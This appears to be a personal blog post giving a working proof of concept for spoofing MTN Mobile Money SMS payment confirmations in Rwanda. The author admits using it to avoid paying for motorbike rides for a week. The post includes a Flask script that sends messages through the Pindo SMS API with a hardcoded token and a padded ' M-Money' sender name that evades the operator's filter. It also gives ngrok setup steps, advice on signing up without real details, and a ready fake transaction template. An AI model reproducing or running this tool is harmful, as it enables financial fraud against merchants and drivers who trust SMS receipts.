# ksjldkjfsl

Big things coming. i’ve create a github repo for POC(proof of concept) check this out..

so apparently when you send money to person with mtn the rarely check the name and the whatnot and i’ve managed to use pindo api to impersonate mtn-mobile money..

personally i’ve manage to take motorbikes for for a whole week because ofcourse i had to test if it works ..and i have decided to make report it to mtn … their firewall can only detect filter message thats titled “M-Monye” but when you add a little bit of space like “M-Money “ you can effectively imporsonate a mobile money and pretend to have sent a person … it was quite effective for people who’re are busy who only checks the message arrival and the money being received… i got caught a couple times with people who pay attention to details 

so here’s a POC

you need few python modules to make it work but the whole process can be achieved by curl message and post methods

python modules

flask 

flask-sqlachemy

flask-wtf

and jinja2 

am not gonna go into the details of those . you can check them out yourself

the script

```python
from flask import Flask, render_template, request, redirect, flash
from flask_wtf import FlaskForm
from wtforms import StringField, TextAreaField
from wtforms.validators import DataRequired
from flask_sqlalchemy import SQLAlchemy
import requests

app = Flask(__name__)
app.config['SECRET_KEY'] = 'idontdrinkmyownpee'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///messages.db'  # Use SQLite database
db = SQLAlchemy(app)

class SMSForm(FlaskForm):
    numbers = StringField('Phone Numbers (comma-separated)', validators=[DataRequired()])
    message = TextAreaField('Message', validators=[DataRequired()])

class Message(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    numbers = db.Column(db.String(255), nullable=False)
    message = db.Column(db.String(255), nullable=False)

PINDO_API_TOKEN = 'eyJhbGciOiJub25lIn0.eyJpZCI6OTgyLCJyZXZva2VkX3Rva2VuX2NvdW50IjowfQ.'

@app.route('/', methods=['GET', 'POST'])
def send_sms():
    form = SMSForm()

    if form.validate_on_submit():
        numbers = form.numbers.data
        message = form.message.data

        numbers_list = [num.strip() for num in numbers.split(',')]

        headers = {'Authorization': 'Bearer ' + PINDO_API_TOKEN}
        url = 'https://api.pindo.io/v1/sms/'

        with app.app_context():  # Enter the application context
            for number in numbers_list:
                data = {'to': number, 'text': message, 'sender': ' M-Money'}
                response = requests.post(url, json=data, headers=headers)

                print(f'Sending to {number}: {response.status_code}')

                # Store the sent message in the database
                new_message = Message(numbers=number, message=message)
                db.session.add(new_message)
                db.session.commit()

            flash('SMS sent successfully!', 'success')
            return redirect('/')

    return render_template('index.html', form=form)

if __name__ == '__main__':
    with app.app_context():  # Enter the application context
        db.create_all()  # Create database tables
    app.run(debug=True)
```

you can use my pindo api token for configuration but you can easily get your token when you sign in … matter of fact you don’t even have to use legimate information … as long as you have a google account you’re good to go when you sign in to pindo you check your profile for 

the token and use the same token but its worth checking it out explore yourself 

then then when you run 

python3 [app.py](http://app.py) considering that you’ve name your app app.py

it runs locally on address 172.0.0.1:5000 on port 5000 because flasks projects typically

runs on port 5000

and then to make the app available to the internet i used ngrok of course am not gonna talk about it but you can get an account right now if you have google account [https://dashboard.ngrok.com/signup](https://dashboard.ngrok.com/signup) you can also create ngrok accoung to get their token for free without providing your personal deatails and here’s the link to download it using git clone [https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz](https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz) .. after downloading you check the file type and unzip it using gzip -d “filename” and when the unzip is done 

the file will come with .tar extension use tar xvf to unarchive it . and then run

`ngrok config add-authtoken "token"`  you’ll use your personal token and after configuring you run it with ./ngrok http 5000 and when you its fully operational you can copy the link provided and paste it in your browser address and then you see something like this

and then you make ngrok run on the same project run on port 5000 as soon as you the local application is on the internet you get an url you input in your browser for sending messages and

now when you send the message its like this …..

i used this template as a message 

You have received 20000 RWF from UWERA MARIE CLAIRE (*********876) on your mobile money account at 2023-08-10 03:27:39. Message from sender: 1. Your new balance: 2018 RWF. Loyalty fee was 0 and loyalty reward was 0. Promotion was 0. Financial Transaction Id: 10438338079.

of course you edit the message to make it look legitmate and when you hop on off the bike you send your imaginary money then you’re good to go.

thats was cool right?

Happy hacking.
